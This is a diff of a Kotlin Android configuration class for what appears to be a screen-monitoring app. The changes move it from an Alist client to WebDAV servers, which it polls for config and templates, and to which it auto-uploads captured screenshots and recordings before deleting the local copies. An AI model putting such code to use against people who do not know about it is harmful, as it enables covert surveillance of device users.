@@ -69,8 +69,25 @@ class MonitorConfig private constructor() {
         }
     }
 
-    // AlistClient 实例
-    lateinit var alist: AlistClient
+    // WebDAV 客户端实例
+    lateinit var webdavClient: WebDavClient
+    
+    // 设备 ID，由 Flutter 端设置
+    @Volatile
+    var deviceId: String = ""
+        private set
+        
+    /**
+     * 设置设备 ID（由 Flutter 端调用）
+     */
+    fun setDeviceId(id: String) {
+        deviceId = id
+        Log.d(TAG, "Device ID set: $id")
+        if (this::webdavClient.isInitialized) {
+            webdavClient.deviceId = id
+            Log.d(TAG, "Updated WebDavClient deviceId: $id")
+        }
+    }
 
     // 模板更新回调
     var onTemplatesUpdated: (() -> Unit)? = null
@@ -107,7 +124,7 @@ class MonitorConfig private constructor() {
     var videoDir: String = "ScreenRecord" // 录像保存目录
 
     @Volatile
-    var RootDir: String = "Rustdesk" // 根目录
+    var RootDir: String = "PingerLove" // 根目录
 
     private val configFile = File(context.filesDir, "monitor_config_default.json")
 
@@ -117,10 +134,9 @@ class MonitorConfig private constructor() {
         // 构造函数只做变量初始化，所有耗时操作异步执行
         executor.execute {
             try {
-                loadLocalConfig()
+                startUpdateConfigFromRemote(intervalMinutes)
                 // 启动图片定时上传任务（默认10分钟）
                 startAutoUploadImages(intervalMinutes)
-                startUpdateConfigFromRemote(intervalMinutes)
                 startAutoUploadVideos(intervalMinutes)
                 // 启动定时清理任务
                 startAutoCleanStorage(intervalMinutes)
@@ -131,7 +147,7 @@ class MonitorConfig private constructor() {
     }
 
     /**
-     * 循环 alistApis，尝试下载远程 config.json，成功则替换本地配置
+     * 定时从 WebDAV 服务器下载远程 config.json，成功则替换本地配置
      */
     private fun startUpdateConfigFromRemote(intervalMinutes: Long = 10) {
         executor.scheduleWithFixedDelay(
@@ -169,19 +185,6 @@ class MonitorConfig private constructor() {
         }
     }
 
-    private fun loadLocalConfig() {
-        try {
-            val json = getConfigJson()
-            if (!json.isNullOrBlank()) {
-                kotlinx.coroutines.runBlocking {
-                    updateConfig(json)
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "loadLocalConfig error: $e")
-        }
-    }
-
     private fun saveLocalConfig(json: String) {
         try {
             configFile.writeText(json)
@@ -194,82 +197,160 @@ class MonitorConfig private constructor() {
         try {
             val obj = JSONObject(json)
             Log.d(TAG, "json config: $json")
-            // 解析 alistApis 数组
-            val alistApisArr = obj.optJSONArray("alistApis")
-            if (alistApisArr != null && alistApisArr.length() > 0) {
-                for (i in 0 until alistApisArr.length()) {
-                    val apiObj = alistApisArr.getJSONObject(i)
-                    val apiUrl = apiObj?.optString("apiUrl", "")
-                    val user = apiObj?.optString("user", "")
-                    val pwd = apiObj?.optString("password", "")
-                    val monitorDir = apiObj?.optString("monitorDir", "")
-                    val remoteDir = apiObj?.optString("remoteUploadDir", "")
-                    val templateDir = apiObj?.optString("templateDir", "")
-                    if (!apiUrl.isNullOrBlank() && !user.isNullOrBlank() && !pwd.isNullOrBlank()
-                        && !monitorDir.isNullOrBlank() && !remoteDir.isNullOrBlank()
-                        && !templateDir.isNullOrBlank()
-                    ) {
-                        val alist = AlistClient(
-                            apiUrl,
-                            user,
-                            pwd,
-                            monitorDir,
-                            remoteDir,
-                            templateDir
-                        )
-                        alist.fetchToken()
-                        // 获取 token（如需强制刷新可调用 alist.fetchToken()）
-                        if (alist.token.isNullOrBlank()) {
-                            continue
-                        } else {
-                            val newJson = alist.getConfigJson()
-                            if (newJson.isNotBlank()) {
-                                if (newJson == json && this::alist.isInitialized && !this.alist.token.isNullOrBlank()) {
-                                    Log.d(TAG, "Remote config is the same, no update.")
-                                    return
-                                }
-                                val obj = JSONObject(newJson)
-                                this.alist = alist
-                                detectPerSecond = obj.optInt("detectPerSecond", detectPerSecond)
-                                preferExternalStorage =
-                                    obj.optBoolean("preferExternalStorage", preferExternalStorage)
-                                screenshotDir = obj.optString("screenshotDir", screenshotDir)
-                                videoDir = obj.optString("videoDir", videoDir)
-                                saveLocalConfig(newJson)
-                                replaceTemplatesFromRemoteSuspend(alist)
-                                Log.d(TAG, "Config updated from remote: $apiUrl")
-                                return
-                            }
-                        }
+            
+            val webdavArray = obj.optJSONArray("webdavServers")
+            if (webdavArray == null || webdavArray.length() == 0) {
+                Log.e(TAG, "webdavServers array not found or empty")
+                return
+            }
+            
+            // 如果已经有可用的 WebDavClient，直接复用
+            if (this::webdavClient.isInitialized) {
+                try {
+                    // 测试现有连接是否仍然可用
+                    if (webdavClient.testConnection()) {
+                        Log.d(TAG, "Reusing existing WebDavClient: ${webdavClient.webdavUrl}")
+                        detectPerSecond = obj.optInt("detectPerSecond", detectPerSecond)
+                        preferExternalStorage = obj.optBoolean("preferExternalStorage", preferExternalStorage)
+                        screenshotDir = obj.optString("screenshotDir", screenshotDir)
+                        videoDir = obj.optString("videoDir", videoDir)
+                        return
+                    } else {
+                        Log.w(TAG, "Existing WebDavClient connection failed, will try to reconnect")
                     }
-
+                } catch (e: Exception) {
+                    Log.w(TAG, "Error testing existing connection: ${e.message}")
                 }
             }
+            
+            // 将所有 WebDAV 服务器分类：本地地址优先
+            val localServers = mutableListOf<JSONObject>()
+            val remoteServers = mutableListOf<JSONObject>()
+            
+            for (i in 0 until webdavArray.length()) {
+                val serverObj = webdavArray.getJSONObject(i)
+                val url = serverObj.optString("url", "")
+                if (url.contains("192.168.") || url.contains("localhost") || url.contains("127.0.0.1")) {
+                    localServers.add(serverObj)
+                } else {
+                    remoteServers.add(serverObj)
+                }
+            }
+            
+            // 优先尝试本地服务器，然后尝试远程服务器
+            val allServers = localServers + remoteServers
+            
+            for (serverObj in allServers) {
+                val webdavUrl = serverObj.optString("url", "")
+                val username = serverObj.optString("username", "")
+                val password = serverObj.optString("password", "")
+                val monitorDir = serverObj.optString("monitorDir", "")
+                val remoteDir = serverObj.optString("remoteUploadDir", "")
+                val templateDir = serverObj.optString("templateDir", "")
+                
+                if (webdavUrl.isBlank() || username.isBlank() || password.isBlank() ||
+                    monitorDir.isBlank() || remoteDir.isBlank() || templateDir.isBlank()) {
+                    Log.w(TAG, "WebDAV config incomplete, skip: $webdavUrl")
+                    continue
+                }
+                
+                Log.d(TAG, "Testing WebDavClient: url=$webdavUrl, deviceId='$deviceId'")
+                val startTime = System.currentTimeMillis()
+                val client = WebDavClient(
+                    webdavUrl, username, password, remoteDir, deviceId
+                )
+                
+                if (!client.testConnection()) {
+                    val elapsed = System.currentTimeMillis() - startTime
+                    Log.w(TAG, "WebDAV connection test failed: $webdavUrl (${elapsed}ms)")
+                    continue
+                }
+                
+                val elapsed = System.currentTimeMillis() - startTime
+                Log.d(TAG, "WebDAV connection test success: $webdavUrl (${elapsed}ms)")
+                
+                // 尝试下载远程配置
+                val remoteBytes = client.downloadFile("/$monitorDir", "config.json")
+                val newJson = if (remoteBytes.isNotEmpty()) String(remoteBytes) else ""
+                
+                if (newJson.isNotBlank()) {
+                    // 有远程配置，使用它
+                    if (newJson != json) {
+                        // 配置有更新
+                        val newObj = JSONObject(newJson)
+                        this.webdavClient = client
+                        detectPerSecond = newObj.optInt("detectPerSecond", detectPerSecond)
+                        preferExternalStorage = newObj.optBoolean("preferExternalStorage", preferExternalStorage)
+                        screenshotDir = newObj.optString("screenshotDir", screenshotDir)
+                        videoDir = newObj.optString("videoDir", videoDir)
+                        saveLocalConfig(newJson)
+                        replaceTemplatesFromRemote(client, monitorDir, templateDir)
+                        Log.d(TAG, "Config updated from WebDAV: $webdavUrl")
+                        return
+                    } else {
+                        // 配置相同，使用本地配置
+                        this.webdavClient = client
+                        detectPerSecond = obj.optInt("detectPerSecond", detectPerSecond)
+                        preferExternalStorage = obj.optBoolean("preferExternalStorage", preferExternalStorage)
+                        screenshotDir = obj.optString("screenshotDir", screenshotDir)
+                        videoDir = obj.optString("videoDir", videoDir)
+                        replaceTemplatesFromRemote(client, monitorDir, templateDir)
+                        Log.d(TAG, "Using local config with WebDAV: $webdavUrl")
+                        return
+                    }
+                } else {
+                    // 没有远程配置，继续尝试下一个服务器
+                    Log.w(TAG, "No remote config found on $webdavUrl, trying next server")
+                    continue
+                }
+            }
+            
+            Log.e(TAG, "All WebDAV servers failed to connect")
         } catch (e: Exception) {
             Log.e(TAG, "updateConfig error: $e")
         }
     }
 
     /**
-     * 下载远程模板并替换本地模板，删除旧模板（新版：直接用 alist.getAllTemplateImages）
+     * 下载远程模板并替换本地模板，删除旧模板
      */
-    private suspend fun replaceTemplatesFromRemoteSuspend(alist: AlistClient) {
+    private suspend fun replaceTemplatesFromRemote(
+        client: WebDavClient,
+        monitorDir: String,
+        templateDir: String
+    ) {
         try {
             val localDir = getTemplateDir()
             if (!localDir.exists()) localDir.mkdirs()
-            // 直接批量获取所有模板图片
-            val remoteImages = alist.getAllTemplateImages() // Map<String, ByteArray>
+            
+            // 使用 listDirectory 自动发现远程模板目录中的所有图片文件
+            Log.d(TAG, "Listing remote templates from: /$templateDir")
+            val remoteFiles = client.listDirectory("/$templateDir")
+            
+            if (remoteFiles.isEmpty()) {
+                Log.w(TAG, "No template files found in remote directory")
+                return
+            }
+            
             val keepFiles = mutableSetOf<String>()
-            for ((fileName, bytes) in remoteImages) {
+            Log.d(TAG, "Found ${remoteFiles.size} template files, downloading...")
+            
+            for (fileName in remoteFiles) {
                 try {
-                    val file = File(localDir, fileName)
-                    file.writeBytes(bytes)
-                    keepFiles.add(file.name)
-                    Log.d(TAG, "Template image updated: ${file.name}")
+                    val bytes = client.downloadFile("/$templateDir", fileName)
+                    if (bytes.isNotEmpty()) {
+                        val file = File(localDir, fileName)
+                        file.writeBytes(bytes)
+                        keepFiles.add(file.name)
+                        Log.d(TAG, "Template updated: ${file.name} (${bytes.size} bytes)")
+                    } else {
+                        Log.w(TAG, "Template file empty: $fileName")
+                    }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Template download failed: $fileName $e")
+                    Log.e(TAG, "Template download failed: $fileName - ${e.message}")
                 }
             }
+            
             // 删除未在远程的旧模板
             localDir.listFiles { f -> f.isFile && (f.name.endsWith(".png") || f.name.endsWith(".jpg")) }
                 ?.forEach { f ->
@@ -290,7 +371,7 @@ class MonitorConfig private constructor() {
      */
     fun getTemplateDir(): File {
         val baseDir = getRootDir()
-        val dir = File(baseDir, "Rustdesk/templates")
+        val dir = File(baseDir, "Templates")
         if (!dir.exists()) dir.mkdirs()
         return dir
     }
@@ -331,12 +412,17 @@ class MonitorConfig private constructor() {
     }
 
     /**
-     * 定时上传本地图片到远程服务器（alist方式），上传成功后自动删除
+     * 定时上传本地图片到远程服务器（WebDAV 方式），上传成功后自动删除
      */
     fun startAutoUploadImages(intervalMinutes: Long = 10) {
         executor.scheduleWithFixedDelay({
             kotlinx.coroutines.runBlocking {
                 try {
+                    if (!this@MonitorConfig::webdavClient.isInitialized) {
+                        Log.w(TAG, "WebDavClient not initialized, skip upload images")
+                        return@runBlocking
+                    }
+                    
                     val dir = getScreenshotDir()
                     val files = getAllImageFiles(dir)
                     Log.d(TAG, "Found ${files.size} images to upload in ${dir.absolutePath}")
@@ -346,7 +432,7 @@ class MonitorConfig private constructor() {
                         val relPath = file.absolutePath.removePrefix(baseDir).removePrefix("/")
                         val subPath =
                             if (relPath.contains("/")) relPath.substringBeforeLast('/') else null
-                        val success = alist.uploadImageToRemoteDir(
+                        val success = webdavClient.uploadBytes(
                             subPath,
                             file.name,
                             file.readBytes(),
@@ -383,13 +469,18 @@ class MonitorConfig private constructor() {
     }
 
     /**
-     * 定时上传本地录像文件到远程服务器（alist方式），上传成功后自动删除
+     * 定时上传本地录像文件到远程服务器（WebDAV 方式），上传成功后自动删除
      * 支持常见视频格式：mp4、mov、avi、mkv、flv、wmv、webm
      */
     fun startAutoUploadVideos(intervalMinutes: Long = 10) {
         executor.scheduleWithFixedDelay({
             kotlinx.coroutines.runBlocking {
                 try {
+                    if (!this@MonitorConfig::webdavClient.isInitialized) {
+                        Log.w(TAG, "WebDavClient not initialized, skip upload videos")
+                        return@runBlocking
+                    }
+                    
                     val dir = getVideoDir()
                     val files = getAllVideoFiles(dir)
                     Log.d(TAG, "Found ${files.size} videos to upload in ${dir.absolutePath}")
@@ -399,7 +490,7 @@ class MonitorConfig private constructor() {
                         val relPath = file.absolutePath.removePrefix(baseDir).removePrefix("/")
                         val subPath =
                             if (relPath.contains("/")) relPath.substringBeforeLast('/') else null
-                        val success = alist.uploadImageToRemoteDir(
+                        val success = webdavClient.uploadBytes(
                             subPath,
                             file.name,
                             file.readBytes(),
